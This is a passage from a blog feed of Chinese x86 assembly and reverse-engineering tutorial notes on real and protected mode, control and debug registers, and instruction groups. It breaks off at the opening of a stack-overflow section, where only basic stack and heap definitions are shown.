title="5fa78f20bd62e5c378f9b34f76273328.png" data-src="https://i.loli.net/2017/12/19/5a386daf9c07a.png" class="lazyload"></a></p><p><a href="https://i.loli.net/2017/12/19/5a386db379d3b.png" data-fancybox="group" data-caption="a13531212829ac5260abf241b3a82e4d.png" class="fancybox"><img alt="a13531212829ac5260abf241b3a82e4d.png" title="a13531212829ac5260abf241b3a82e4d.png" data-src="https://i.loli.net/2017/12/19/5a386db379d3b.png" class="lazyload"></a></p><h1 id="实模式"><a href="#实模式" class="headerlink" title="实模式"></a>实模式</h1><p><a href="https://i.loli.net/2017/12/19/5a386db662d97.png" data-fancybox="group" data-caption="ea5b07755098e8e79357a739b6fac0b9.png" class="fancybox"><img alt="ea5b07755098e8e79357a739b6fac0b9.png" title="ea5b07755098e8e79357a739b6fac0b9.png" data-src="https://i.loli.net/2017/12/19/5a386db662d97.png" class="lazyload"></a></p><p>它是 Intel公司80286及以后的x86(80386,80486和80586等)兼容处理器（CPU）的一种操作模式。实模式被特殊定义为20位地址内存可访问空间上，这就意味着它的容量是2的20次幂（1M）的可访问内存空间（物理内存和BIOS-ROM），软件可通过这些地址直接访问BIOS程序和外围硬件。实模式下处理器没有硬件级的内存保护概念和多道任务的工作模式。但是为了向下兼容，所以80286及以后的x86系列兼容处理器仍然是开机启动时工作在实模式下。80186和早期的处理器仅有一种操作模式，就是后来我们所定义的实模式。实模式虽然能访问到1M的地址空间，但是由于BIOS的映射作用（即BIOS占用了部分空间地址资源），所以真正能使用的物理内存空间（内存条），也就是在640k到924k之间。1M 地址空间组成是由 16位的段地址和16位的段内偏移地址组成的。用公式表示为：<strong>物理地址=</strong>左移<strong>4</strong>位的段地址<strong>+偏移地址</strong>。</p><h3 id="保护模式："><a href="#保护模式：" class="headerlink" title="保护模式："></a><a href="https://baike.baidu.com/item/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F" target="_blank" rel="noopener">保护模式</a>：</h3><p>寻址采用32位段和偏移量，最大<a href="https://baike.baidu.com/item/%E5%AF%BB%E5%9D%80%E7%A9%BA%E9%97%B4" target="_blank" rel="noopener">寻址空间</a>4GB，最大分段4GB<br>(Pentium<br>Pre及以后为64GB)。在保护模式下CPU可以进入虚拟8086方式，这是在保护模式下的实模式程序运行环境。</p><p><a href="https://i.loli.net/2017/12/19/5a386dbbb0f5a.png" data-fancybox="group" data-caption="a4a9ab781ca7531d32f00d7f37c3d711.png" class="fancybox"><img alt="a4a9ab781ca7531d32f00d7f37c3d711.png" title="a4a9ab781ca7531d32f00d7f37c3d711.png" data-src="https://i.loli.net/2017/12/19/5a386dbbb0f5a.png" class="lazyload"></a></p><p>在80286以及更高系列的PC中，即使A20<br>Gate被打开，在实模式下所能够访问的内存最大也只能为10FFEFH，尽管它们的地址总线所能够访问的能力都大大超过这个限制。为了能够访问10FFEFH以上的内存，则必须进入保护模式。</p><p>（286是Intel 80286的另一种叫法） 它又被称作为<strong>虚拟地址保护模式</strong>。尽管在Intel<br>80286手册中已经提出了虚地址保护模式，但实际上它只是一个指引，真正的32位地址出现在Intel<br>80386上。保护模式本身是80286及以后兼容处理器序列之后产成的一种操作模式，它具有许多特性设计为提高系统的多道任务和<strong>系统的稳定性</strong>。例如<strong>内存的保护</strong>，<strong>分页机制</strong>和<strong>硬件虚拟存储</strong>的支持。现代多数的x86处理器操作系统都运行在保护模式下，包括Linux,<br>Free BSD, 和Windows3.0（它也运行在实模式下，为了和Windows<br>2.x应用程序兼容）及以后的版本。</p><p><strong>实模式和保护模式的区别</strong></p><p>从表面上看，保护模式和实模式并没有太大的区别，二者都使用了内存段、中断和设备驱动来处理硬件，但二者有很多不同之处。我们知道，在实模式中内存被划分成段，每个段的大小为 64KB ，而这样的段地址可以用 16 位来表示。内存段的处理是通过和段寄存器相关联的内部机制来处理的，这些段寄存器（ CS 、 DS 、 SS 和ES ）的内容形成了物理地址的一部分。具体来说，最终的物理地址是由 16 位的段地址和 16 位的段内偏移地址组成的。用公式表示为：物理地址 = 左移 4 位的段地址 + 偏移地址。</p><p>在保护模式下，段是通过一系列被称之为 “ <strong>描述符表</strong> ” 的表所定义的。段寄存器存储的是指向这些表的指针。用于定义内存段的表有两种：全局描述符表 (GDT) 和局部描述符表** <strong>(LDT) 。 GDT 是一个段描述符数组，其中包含所有应用程序都可以使用的基本描述符。在实模式中，段长是固定的 ( 为 64KB) ，而在保护模式中，段长是可变的，其最大可达 4GB 。LDT 也是段描述符的一个数组。与 GDT 不同， LDT 是一个段，其中存放的是局部的、不需要全局共享的段描述符。每一个操作系统都必须定义一个</strong> <strong>GDT</strong> <strong>，而每一个正在运行的任务都会有一个相应的</strong> <strong>LDT</strong> <strong>。每一个描述符的长度是</strong> <strong>8</strong> **个字节，格式如图 3 所示。当段寄存器被加载的时候，段基地址就会从相应的表入口获得。描述符的内容会被存储在一个程序员不可见的影像寄存器 (shadow<br>register) 之中，以便下一次同一个段可以使用该信息而不用每次都到表中提取。物理地址由 16 位或者 32 位的偏移加上影像寄存器中的基址组成。实模式和保护模式的不同可以从下图很清楚地看出来。</p><p><strong>实模式地址</strong></p><p><a href="https://i.loli.net/2017/12/19/5a386dbe9b177.jpg" data-fancybox="group" data-caption="283ccbe56e2f203c838f1731936bfc38.jpg" class="fancybox"><img alt="283ccbe56e2f203c838f1731936bfc38.jpg" title="283ccbe56e2f203c838f1731936bfc38.jpg" data-src="https://i.loli.net/2017/12/19/5a386dbe9b177.jpg" class="lazyload"></a></p><p><strong>保护模式地址</strong></p><p><a href="https://i.loli.net/2017/12/19/5a386dc06a338.jpg" data-fancybox="group" data-caption="ca5d768386e99ceaa5930ef3c2b68b93.jpg" class="fancybox"><img alt="ca5d768386e99ceaa5930ef3c2b68b93.jpg" title="ca5d768386e99ceaa5930ef3c2b68b93.jpg" data-src="https://i.loli.net/2017/12/19/5a386dc06a338.jpg" class="lazyload"></a></p><p>保护模式同实模式的根本区别是进程内存受保护与否。可寻址空间的区别只是这一原因的果。实模式将整个物理内存看成分段的区域,程序代码和数据位于不同区域，系统程序和用户程序没有区别对待，而且每一个指针都是指向”实在”的物理地址。这样一来，用户程序的一个指针如果指向了系统程序区域或其他用户程序<br>区域，并改变了值，那么对于这个被修改的系统程序或用户程序，其后果就很可能是灾难性的。为了克服这种低劣的内存管理方式，处理器厂商开发出保护模式。这<br>样，物理内存地址不能直接被程序访问，程序内部的地址（虚拟地址）要由操作系统转化为物理地址去访问，程序对此一无所知。</p><p><a href="https://i.loli.net/2017/12/19/5a386dc411cea.png" data-fancybox="group" data-caption="0cf80a18ac54b1fe9e22f774ed60e4dc.png" class="fancybox"><img alt="0cf80a18ac54b1fe9e22f774ed60e4dc.png" title="0cf80a18ac54b1fe9e22f774ed60e4dc.png" data-src="https://i.loli.net/2017/12/19/5a386dc411cea.png" class="lazyload"></a></p><p>1、RPL 选择子当中的权限位确定的权限</p><p>2、CPL 特指CS中的选择子当中的权限位确定的权限</p><p>3、EPL EPL=Max(RPL,CPL),即RPL和CPL中数值较大的，或说权限等级较小的</p><p>4、DPL 描述符中的权限位确定的权限</p><p>5、PL 泛指以上4种特权级</p><p>6、任务特权 =CPL</p><p>7、I/O特权 由EFLAGS寄存器的位13、14确定的权限</p><p>8、一致代码段 一种特殊的代码段，它在CPL&gt;=DPL时允许访问</p><p>正常的代码段在CPL=DPL RPL&lt;=DPL时才允许访问</p><p><em>五、控制寄存器</em></p><p>80386的控制寄存器有4个，其中CR1保留以后使用，从Pentium开始，又增加了一个CR4，CR0的低16位包含了与80286的MSW一致的位定义，保持了和80286的兼容，同时也兼容了从80286开始的两条指令LMSW/SMSW，其基本定义如下：</p><p><a href="https://i.loli.net/2017/12/19/5a386dc5d696c.jpg" data-fancybox="group" data-caption="29800129903fc3ff4db840b72cb129be.jpg" class="fancybox"><img alt="29800129903fc3ff4db840b72cb129be.jpg" title="29800129903fc3ff4db840b72cb129be.jpg" data-src="https://i.loli.net/2017/12/19/5a386dc5d696c.jpg" class="lazyload"></a></p><pre><code>CR0中各位含义如下：</code></pre><ul><li><p>PE（Protection<br>Enable）保护模式允许，PE=0表示CPU工作在实模式，PE=1表示CPU工作在保护模式</p></li><li><p>MP（Monitor<br>Coprocessor）监控协处理器，MP=1表示协处理器在工作，MP=0表示协处理器未工作。</p></li><li><p>EM（Emulation）协处理器仿真，当MP=0，EM=1时，表示正在使用软件仿真协处理器工作。</p></li><li><p>TS（Task<br>Switched）任务转换，每当进行任务转换时，TS=1，任务转换完毕，TS=0。TS=1时不允许协处理器工作。</p><p>以上4个定义从80286开始，下面的2个定义从80386开始存在</p></li><li><p>ET（Extension<br>Type）处理器扩展类型，反映了所扩展的协处理器的类型，ET=0为80287，ET=1为80387。</p></li><li><p>PG（Paging）页式管理机制使能，PG=1时页式管理机制工作，否则不工作。</p><p>从80486开始又增加了如下位定义。</p></li><li><p>NE（Numeric<br>Error）数值异常中断控制，NE=1时，如果运行协处理器指令发生故障，则用异常中断处理，NE=0时，则用外部中断处理。</p></li><li><p>WP（Write Protect）写保护，当WP=1时，对只读页面进行写操作会产生页故障。</p></li><li><p>AM（Alignment<br>Mask）对齐标志，AM=1时，允许对齐检查，AM=0时不允许，关于对齐，在EFLAGS的AC标志时介绍过，在80486以后的CPU中，CPU进行对齐检查需要满足三个条件，AC=1、AM=1并且当前特权级为3。</p></li><li><p>NW（Not Write-through）和CD（Cache<br>Disable），这两个标志都是用来控制CPU内部的CACHE的，当NW=0且CD=0时，CACHE使能，其它的组合说起来比较复杂，如果有读者真的想搞清楚的话，可以参阅《Intel?<br>64 and IA-32 Architectures》中的“Software Developer’s Manual Volume<br>3A”这一册，在第10章对这两个标志的各种组合有比较详细的说明。</p></li></ul><p>CR1保留未用；CR2存放引起页故障的线性地址，只有在PG=1时，CR2才有效，当页故障处理程序被激活时，压入页故障处理程序堆栈中的错误码提供页故障的状态信息。  </p><p>CR3的bit12–bit31存放页目录的基地址，因为也目录总是页对齐的（一页为4K），所以页目录基地址从bit12开始就可以了。只有当CR0中的PG=1时，CR3的页目录基地址才有效。<br>    从80486开始，在CR3的低12位定义了两个控制位，如下：</p><ul><li><p>PCD（Page-level Cache<br>Disable）页CACHE禁止，当PCD=0时，页目录表进行高速缓存，PCD=1时，不进行高速缓存；该位控制PCD引脚控制外部CACHE工作还是不工作。</p></li><li><p>PWT（Page-level Writes<br>Transparent），CACHE的写入分为透写（Write-Through）和回写（Write-Back）,80486以上的CPU内部的CACHE都是透写的，但对外部CACHE而言，允许某些页是回写的，而另一些页是透写的，当PWT=1时，外部CACHE对页目录进行透写，否则进行回写；此位驱动PWT引脚以控制外部CACHE是透写还是回写。</p><p>CR4是从Pentium CPU开始出现的。</p></li><li><p>VME（Virtual-8086 Mode<br>Extensions）虚拟8086方式扩展，VME=1允许使用虚拟8086扩展模式，否则只能使用80386/80486的虚拟8086模式。</p></li><li><p>PVI（Protected-Mode Virtual<br>Interrupts）保护模式虚拟中断，PVI=1时，在保护模式下支持虚拟中断标志VIF(EFLAGS中)，PVI=0则不支持虚拟中断标志。</p></li><li><p>TSD（Time Stamp<br>Disable）时间戳禁止，TSD=1时，允许在特权级为0的程序中执行RDTSC指令（读时间戳计数指令），TSD=0时，允许任何特权级执行RDTSC指令。</p></li><li><p>DE（Debugging Extensions）调试扩展，</p></li><li><p>PSE（Page Size<br>Extensions）页大小扩展，PSE=1时，页大小可以扩展到2M或4M，PSE=0时，页大小只能是4K.</p></li><li><p>PAE（Physical Address<br>Extension）物理地址扩展，PAE=1时，页物理地址可以扩展到36bits以上，PAE=0时只能用32bits的物理地址。</p></li><li><p>MCE（Machine-Check<br>Enable）硬件检查使能，Pentium以后的CPU有一种硬件检测功能，MCE=1时允许使用该功能。</p></li><li><p>PGE（Page Global<br>Enable）全局页使能，PGE=1时，允许使用全局页，PGE=0时禁止使用全局页。</p></li><li><p>PCE（Performance-Monitoring Counter<br>Enable）性能监视计数器使能，当PCE=1时，允许在任何保护级下执行RDPMC指令，PCE=0时，只有特权级0的程序可以执行RDPMC指令。</p></li><li><p>OSFXSR（Operating System Support for FXSAVE and FXRSTOR instructions）</p></li><li><p>OSXMMEXCPT（Operating System Support for Unmasked SIMD Floating-Point<br>Exceptions）</p></li><li><p>VMXE（VMX-Enable Bit）VMX使能位，VMXE=1时，允许VMX操作。</p></li><li><p>SMXE（SMX-Enable Bit）SMX使能位，SMXE=1时，允许SMX操作。</p></li><li><p>OSXSAVE（XSAVE and Processor Extended States-Enable Bit）  </p></li></ul><p><em>六、调试寄存器</em></p><p>一共有8个调试寄存器DR0–DR7，DR0-DR3可以分别设置4个断点的线性地址，DR4-DR5保留未用，DR6是断点状态寄存器，DR7是断点控制寄存器（包括断点类型、断点长度，断点开放/禁止）</p><p>七、测试寄存器</p><p>一共有8个测试寄存器TR0–TR7，TR0-TR2保留，TR3-TR5用作CACHE测试，TR6为命令测试寄存器，TR7为测试数据寄存器。</p><p><strong>数据传送指令</strong></p><p><a href="https://i.loli.net/2017/12/19/5a3896eb47df2.png" data-fancybox="group" data-caption="0c47a83640959d7c625818e1b694e5d8.png" class="fancybox"><img alt="0c47a83640959d7c625818e1b694e5d8.png" title="0c47a83640959d7c625818e1b694e5d8.png" data-src="https://i.loli.net/2017/12/19/5a3896eb47df2.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a3896eda5f2a.png" data-fancybox="group" data-caption="ccba9090b3091d3df2a18e808da4819c.png" class="fancybox"><img alt="ccba9090b3091d3df2a18e808da4819c.png" title="ccba9090b3091d3df2a18e808da4819c.png" data-src="https://i.loli.net/2017/12/19/5a3896eda5f2a.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a3896f0382d1.png" data-fancybox="group" data-caption="9a5ce8b3ce516dd8bb9bc5135500767a.png" class="fancybox"><img alt="9a5ce8b3ce516dd8bb9bc5135500767a.png" title="9a5ce8b3ce516dd8bb9bc5135500767a.png" data-src="https://i.loli.net/2017/12/19/5a3896f0382d1.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a3896f564e52.png" data-fancybox="group" data-caption="6beecf08059e0448b89b1da58cb89d9b.png" class="fancybox"><img alt="6beecf08059e0448b89b1da58cb89d9b.png" title="6beecf08059e0448b89b1da58cb89d9b.png" data-src="https://i.loli.net/2017/12/19/5a3896f564e52.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a3896f74406e.png" data-fancybox="group" data-caption="68ed70d33227e087747326a980e9ac71.png" class="fancybox"><img alt="68ed70d33227e087747326a980e9ac71.png" title="68ed70d33227e087747326a980e9ac71.png" data-src="https://i.loli.net/2017/12/19/5a3896f74406e.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a3896fb8cc38.png" data-fancybox="group" data-caption="ff7c1f365ec61dce1ff59085006e4c8d.png" class="fancybox"><img alt="ff7c1f365ec61dce1ff59085006e4c8d.png" title="ff7c1f365ec61dce1ff59085006e4c8d.png" data-src="https://i.loli.net/2017/12/19/5a3896fb8cc38.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a3896fd4f53c.png" data-fancybox="group" data-caption="d973137fc7bce212251bdef43ff1c6bd.png" class="fancybox"><img alt="d973137fc7bce212251bdef43ff1c6bd.png" title="d973137fc7bce212251bdef43ff1c6bd.png" data-src="https://i.loli.net/2017/12/19/5a3896fd4f53c.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a3897002bb44.png" data-fancybox="group" data-caption="80ea7f2725c3c6a38f5150661f597c69.png" class="fancybox"><img alt="80ea7f2725c3c6a38f5150661f597c69.png" title="80ea7f2725c3c6a38f5150661f597c69.png" data-src="https://i.loli.net/2017/12/19/5a3897002bb44.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a389701b6d42.png" data-fancybox="group" data-caption="9f455c0ea3981c6c955982c39fd9af12.png" class="fancybox"><img alt="9f455c0ea3981c6c955982c39fd9af12.png" title="9f455c0ea3981c6c955982c39fd9af12.png" data-src="https://i.loli.net/2017/12/19/5a389701b6d42.png" class="lazyload"></a></p><p><strong>算术运算指令</strong></p><p><a href="https://i.loli.net/2017/12/19/5a38977bdf904.png" data-fancybox="group" data-caption="1f03d065699c062e4a935ff21c4ea93c.png" class="fancybox"><img alt="1f03d065699c062e4a935ff21c4ea93c.png" title="1f03d065699c062e4a935ff21c4ea93c.png" data-src="https://i.loli.net/2017/12/19/5a38977bdf904.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a38977da3458.png" data-fancybox="group" data-caption="d20668bdc119c5ee4413ffe57bf726f3.png" class="fancybox"><img alt="d20668bdc119c5ee4413ffe57bf726f3.png" title="d20668bdc119c5ee4413ffe57bf726f3.png" data-src="https://i.loli.net/2017/12/19/5a38977da3458.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a38977ec7cf9.png" data-fancybox="group" data-caption="453e1347cc9676c7d7fc30cbdb5335b9.png" class="fancybox"><img alt="453e1347cc9676c7d7fc30cbdb5335b9.png" title="453e1347cc9676c7d7fc30cbdb5335b9.png" data-src="https://i.loli.net/2017/12/19/5a38977ec7cf9.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a3897804e4a4.png" data-fancybox="group" data-caption="97a053548fe6d902d09a54e571a82bfa.png" class="fancybox"><img alt="97a053548fe6d902d09a54e571a82bfa.png" title="97a053548fe6d902d09a54e571a82bfa.png" data-src="https://i.loli.net/2017/12/19/5a3897804e4a4.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a38978139e6e.png" data-fancybox="group" data-caption="060f4fb3226c2727e6a0d686454edcc6.png" class="fancybox"><img alt="060f4fb3226c2727e6a0d686454edcc6.png" title="060f4fb3226c2727e6a0d686454edcc6.png" data-src="https://i.loli.net/2017/12/19/5a38978139e6e.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a38978322a59.png" data-fancybox="group" data-caption="44ba5dc30cc16e227687804cd6bc42e3.png" class="fancybox"><img alt="44ba5dc30cc16e227687804cd6bc42e3.png" title="44ba5dc30cc16e227687804cd6bc42e3.png" data-src="https://i.loli.net/2017/12/19/5a38978322a59.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a38978433fe3.png" data-fancybox="group" data-caption="ae291f4a22042cec9286e1e5e188b37c.png" class="fancybox"><img alt="ae291f4a22042cec9286e1e5e188b37c.png" title="ae291f4a22042cec9286e1e5e188b37c.png" data-src="https://i.loli.net/2017/12/19/5a38978433fe3.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a3897885ceb9.png" data-fancybox="group" data-caption="914d2c2494e0d9ec4a64ead1e2e2b4f6.png" class="fancybox"><img alt="914d2c2494e0d9ec4a64ead1e2e2b4f6.png" title="914d2c2494e0d9ec4a64ead1e2e2b4f6.png" data-src="https://i.loli.net/2017/12/19/5a3897885ceb9.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a38978a1893f.png" data-fancybox="group" data-caption="ef08185ae80a94473e79b3fd145bd0c2.png" class="fancybox"><img alt="ef08185ae80a94473e79b3fd145bd0c2.png" title="ef08185ae80a94473e79b3fd145bd0c2.png" data-src="https://i.loli.net/2017/12/19/5a38978a1893f.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a38978af2646.png" data-fancybox="group" data-caption="b35e8a6208468e90fe54addc38e84f16.png" class="fancybox"><img alt="b35e8a6208468e90fe54addc38e84f16.png" title="b35e8a6208468e90fe54addc38e84f16.png" data-src="https://i.loli.net/2017/12/19/5a38978af2646.png" class="lazyload"></a></p><p>商和余数都放2字节</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;标志寄存器&quot;&gt;&lt;a href=&quot;#标志寄存器&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="汇编" scheme="https://kabeor.github.io/categories/%E6%B1%87%E7%BC%96/"/>
    
    <category term="漏洞银行逆向教程" scheme="https://kabeor.github.io/categories/%E6%B1%87%E7%BC%96/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8C%E9%80%86%E5%90%91%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="漏洞银行" scheme="https://kabeor.github.io/tags/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>漏洞银行逆向教程4</title>
    <link href="https://kabeor.github.io/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8C%E9%80%86%E5%90%91%E6%95%99%E7%A8%8B4/"/>
    <id>https://kabeor.github.io/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8C%E9%80%86%E5%90%91%E6%95%99%E7%A8%8B4/</id>
    <published>2018-02-03T16:00:00.000Z</published>
    <updated>2020-03-16T04:33:36.073Z</updated>
    
    <content type="html"><![CDATA[<h2 id="逻辑运算指令和控制运算指令"><a href="#逻辑运算指令和控制运算指令" class="headerlink" title="逻辑运算指令和控制运算指令"></a>逻辑运算指令和控制运算指令</h2><p><a href="https://i.loli.net/2017/12/19/5a389e0104e56.png" data-fancybox="group" data-caption="63fd8d918cd8ea5285439cb309e7fe8f.png" class="fancybox"><img alt="63fd8d918cd8ea5285439cb309e7fe8f.png" title="63fd8d918cd8ea5285439cb309e7fe8f.png" data-src="https://i.loli.net/2017/12/19/5a389e0104e56.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a389e0277f77.png" data-fancybox="group" data-caption="a6a4e72be8e55340cdbca815edb6b817.png" class="fancybox"><img alt="a6a4e72be8e55340cdbca815edb6b817.png" title="a6a4e72be8e55340cdbca815edb6b817.png" data-src="https://i.loli.net/2017/12/19/5a389e0277f77.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a389e0478e1f.png" data-fancybox="group" data-caption="5661149513846370d7c53a1ac88a6e82.png" class="fancybox"><img alt="5661149513846370d7c53a1ac88a6e82.png" title="5661149513846370d7c53a1ac88a6e82.png" data-src="https://i.loli.net/2017/12/19/5a389e0478e1f.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a389e0776548.png" data-fancybox="group" data-caption="b16f1d304b358fb75d828006a73fad4f.png" class="fancybox"><img alt="b16f1d304b358fb75d828006a73fad4f.png" title="b16f1d304b358fb75d828006a73fad4f.png" data-src="https://i.loli.net/2017/12/19/5a389e0776548.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a389e1033b28.png" data-fancybox="group" data-caption="c555a83ea5081143a7e1f8d6441a2af8.png" class="fancybox"><img alt="c555a83ea5081143a7e1f8d6441a2af8.png" title="c555a83ea5081143a7e1f8d6441a2af8.png" data-src="https://i.loli.net/2017/12/19/5a389e1033b28.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a389e128a619.png" data-fancybox="group" data-caption="531713680f5fa45ea0c439d032af6184.png" class="fancybox"><img alt="531713680f5fa45ea0c439d032af6184.png" title="531713680f5fa45ea0c439d032af6184.png" data-src="https://i.loli.net/2017/12/19/5a389e128a619.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a389e1700370.png" data-fancybox="group" data-caption="0ad498b4dca6ad757235ca477ce31610.png" class="fancybox"><img alt="0ad498b4dca6ad757235ca477ce31610.png" title="0ad498b4dca6ad757235ca477ce31610.png" data-src="https://i.loli.net/2017/12/19/5a389e1700370.png" class="lazyload"></a></p><p>算数/逻辑左移相当于乘2，算数右移相当于除以二</p><p><a href="https://i.loli.net/2017/12/19/5a389e1a3f13a.png" data-fancybox="group" data-caption="61c5dfb5d5204949d76e68e81294612d.png" class="fancybox"><img alt="61c5dfb5d5204949d76e68e81294612d.png" title="61c5dfb5d5204949d76e68e81294612d.png" data-src="https://i.loli.net/2017/12/19/5a389e1a3f13a.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a389e1d11aab.png" data-fancybox="group" data-caption="e6a4d9d97f41032f5832762ec7246bae.png" class="fancybox"><img alt="e6a4d9d97f41032f5832762ec7246bae.png" title="e6a4d9d97f41032f5832762ec7246bae.png" data-src="https://i.loli.net/2017/12/19/5a389e1d11aab.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a389ed4966b7.png" data-fancybox="group" data-caption="5f9bb2b505c48b4f0d2051c339ad1760.png" class="fancybox"><img alt="5f9bb2b505c48b4f0d2051c339ad1760.png" title="5f9bb2b505c48b4f0d2051c339ad1760.png" data-src="https://i.loli.net/2017/12/19/5a389ed4966b7.png" class="lazyload"></a></p><h2 id="串操作和处理器控制指令"><a href="#串操作和处理器控制指令" class="headerlink" title="串操作和处理器控制指令"></a>串操作和处理器控制指令</h2><p><a href="https://i.loli.net/2017/12/19/5a389f6c97e49.png" data-fancybox="group" data-caption="819ec01de9178d77352c581a8d3a6929.png" class="fancybox"><img alt="819ec01de9178d77352c581a8d3a6929.png" title="819ec01de9178d77352c581a8d3a6929.png" data-src="https://i.loli.net/2017/12/19/5a389f6c97e49.png" class="lazyload"></a></p><p>串传送指令：</p><p><a href="https://i.loli.net/2017/12/19/5a389f6c99865.png" data-fancybox="group" data-caption="b28b8e56429950c4f6f100b51a693681.png" class="fancybox"><img alt="b28b8e56429950c4f6f100b51a693681.png" title="b28b8e56429950c4f6f100b51a693681.png" data-src="https://i.loli.net/2017/12/19/5a389f6c99865.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a389f6cd237e.png" data-fancybox="group" data-caption="7fcd219e6c8213e0da8e438c5ea63b20.png" class="fancybox"><img alt="7fcd219e6c8213e0da8e438c5ea63b20.png" title="7fcd219e6c8213e0da8e438c5ea63b20.png" data-src="https://i.loli.net/2017/12/19/5a389f6cd237e.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a389f6cdefba.png" data-fancybox="group" data-caption="cc8784dd8dd753039dfc7f56a21c2f00.png" class="fancybox"><img alt="cc8784dd8dd753039dfc7f56a21c2f00.png" title="cc8784dd8dd753039dfc7f56a21c2f00.png" data-src="https://i.loli.net/2017/12/19/5a389f6cdefba.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a389f6ce0afd.png" data-fancybox="group" data-caption="26ddd3baabf7be9b0a8f42db219608a2.png" class="fancybox"><img alt="26ddd3baabf7be9b0a8f42db219608a2.png" title="26ddd3baabf7be9b0a8f42db219608a2.png" data-src="https://i.loli.net/2017/12/19/5a389f6ce0afd.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a389f6cea96b.png" data-fancybox="group" data-caption="2e053187c3b4516ee5d316ea6b031272.png" class="fancybox"><img alt="2e053187c3b4516ee5d316ea6b031272.png" title="2e053187c3b4516ee5d316ea6b031272.png" data-src="https://i.loli.net/2017/12/19/5a389f6cea96b.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a389f6ceede2.png" data-fancybox="group" data-caption="e44a58fff2ba844719d1232dddcc1d35.png" class="fancybox"><img alt="e44a58fff2ba844719d1232dddcc1d35.png" title="e44a58fff2ba844719d1232dddcc1d35.png" data-src="https://i.loli.net/2017/12/19/5a389f6ceede2.png" class="lazyload"></a></p><h1 id="加密解密与二进制漏洞"><a href="#加密解密与二进制漏洞" class="headerlink" title="加密解密与二进制漏洞"></a>加密解密与二进制漏洞</h1><h2 id="栈溢出与shellcode编写"><a href="#栈溢出与shellcode编写" class="headerlink" title="栈溢出与shellcode编写"></a>栈溢出与shellcode编写</h2><p>1，栈</p><p><a href="https://i.loli.net/2017/12/19/5a38a0114b5fb.png" data-fancybox="group" data-caption="7af242ad80ef0eedc4d8cb30390a082f.png" class="fancybox"><img alt="7af242ad80ef0eedc4d8cb30390a082f.png" title="7af242ad80ef0eedc4d8cb30390a082f.png" data-src="https://i.loli.net/2017/12/19/5a38a0114b5fb.png" class="lazyload"></a></p><p>出栈：后进的先出</p><p>堆和栈的区别：<br>　　一、堆栈空间分配区别：<br>　　1、栈（<a href="https://www.baidu.com/s?wd=%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F&tn=44039180_cpr&fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1YdPWT3m1mzuHfsrAmdrjmk0ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3En1m4nH6YPjD" target="_blank" rel="noopener">操作系统</a>）：由<a href="https://www.baidu.com/s?wd=%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F&tn=44039180_cpr&fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1YdPWT3m1mzuHfsrAmdrjmk0ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3En1m4nH6YPjD" target="_blank" rel="noopener">操作系统</a>自动分配释放<br>，存放函数的参数值，局部变量的值等。其操作方式类似于数据结构中的栈；<br>　　2、堆（<a href="https://www.baidu.com/s?wd=%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F&tn=44039180_cpr&fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1YdPWT3m1mzuHfsrAmdrjmk0ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3En1m4nH6YPjD" target="_blank" rel="noopener">操作系统</a>）：<br>一般由程序员分配释放，<br>若程序员不释放，程序结束时可能由OS回收，分配方式倒是类似于链表。<br>　　二、堆栈缓存方式区别：<br>　　